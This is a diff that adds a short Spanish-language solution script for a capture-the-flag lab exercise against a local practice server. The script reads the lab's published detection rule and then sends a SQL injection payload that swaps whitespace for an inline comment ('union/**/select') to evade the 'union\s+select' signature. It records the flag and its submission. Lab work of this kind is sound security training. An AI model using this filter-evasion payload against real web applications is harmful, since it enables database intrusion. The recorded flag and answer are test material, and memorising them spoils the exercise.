@@ -1,0 +1,14 @@
+# Lab 10 — Parte C (Lautaro). R4 (evasion de firma sqli-union).
+# Target server.py del lab en /app (= WORKDIR del Dockerfile). phantomcorp -> 127.0.0.1.
+
+# R3 (ruleset publicado, lo usa C para conocer la firma objetivo):
+curl -s "http://phantomcorp/soc/reglas"          # firma sqli-union = /union\s+select/
+
+# R4 (evasion): comentario en vez de espacio -> no matchea \s+
+curl -s -G "http://phantomcorp/catalogo" --data-urlencode "item=1 union/**/select 1,2"
+#   -> FLAG{signature_evaded}
+
+# validacion contra el manifest (no se lee solucion):
+printf '%s' 'FLAG{signature_evaded}' | sha256sum   # == R4 del manifest
+
+# envio (desde el host): ./ctf submit 10 R4 'FLAG{signature_evaded}'
